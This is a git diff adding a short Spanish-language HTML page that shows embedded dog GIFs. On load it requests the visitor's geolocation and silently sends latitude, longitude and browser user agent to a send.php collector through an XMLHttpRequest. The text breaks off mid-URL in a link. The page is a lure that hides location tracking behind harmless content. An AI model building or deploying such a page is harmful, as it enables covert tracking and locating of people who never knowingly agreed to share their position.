@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Geolocalización</title>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else {
+                alert("La geolocalización no es soportada por este navegador.");
+            }
+        }
+
+        function showPosition(position) {
+            const xhttp = new XMLHttpRequest();
+            const lat = position.coords.latitude;
+            const long = position.coords.longitude;
+            const agent = navigator.userAgent;
+            xhttp.open("GET", `send.php?lat=${lat}&long=${long}&agent=${agent}`, true);
+            xhttp.send();
+        }
+    </script>
+</head>
+<body onload="getLocation()">
+    <iframe src="https://www.bing.com/images/search?view=detailV2&ccid=3z37LaT8&id=8CD287C57614ADBEBD19311CA954318EECE0FE07&thid=OIP.3z37LaT88rfgstZpUo8HfQHaHa&mediaurl=https%3A%2F%2Fmedia1.tenor.com%2Fimages%2Fdf3dfb2da4fcf2b7e0b2d669528f077d%2Ftenor.gif%3Fitemid%3D14698174&cdnurl=https%3A%2F%2Fth.bing.com%2Fth%2Fid%2FR.df3dfb2da4fcf2b7e0b2d669528f077d%3Frik%3DB%252f7g7I4xVKkcMQ%26pid%3DImgRaw%26r%3D0&exph=640&expw=640&q=gif+de+perro&simid=608003327930883497&form=IRPRST&ck=E7FC249E66750E75E3B869C808DB2D6C&selectedindex=0&itb=0&ajaxhist=0&ajaxserp=0&vt=0&sim=11" width="480" height="270" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
+    <p>
+        <a href="https://www.bing.com/images/search?view=detailV2&ccid=VAuhH8aY&id=B7A640117F78F74D6950525E1BD52420A89CC92C&thid=OIP.VAuhH8aYrcPcUShvvkgzcgAAAA&mediaurl=https%3A%2F%2Fth.bing.com%2Fth%2Fid%2FR.540ba11fc698adc3dc51286fbe483372%3Frik%3DLMmcqCAk1RteUg%26riu%3Dhttp%253a%252f%252f5b0988e595225.cdn.sohucs.com%252fimages%252f20171010%252f9a102fabf78347ce8310159334e3d597.gif%26ehk%3DRcL1poq%252btTc0hJOpUcY4VKj8KIWOBN3uJf%252fiXH3yEtE%253d%26risl%3D%26pid%3DImgRaw%26r%3D0&exph=325&expw=250&q=gif+de+perro&simid=608004783883252307&form=IRPRST&ck=17121D
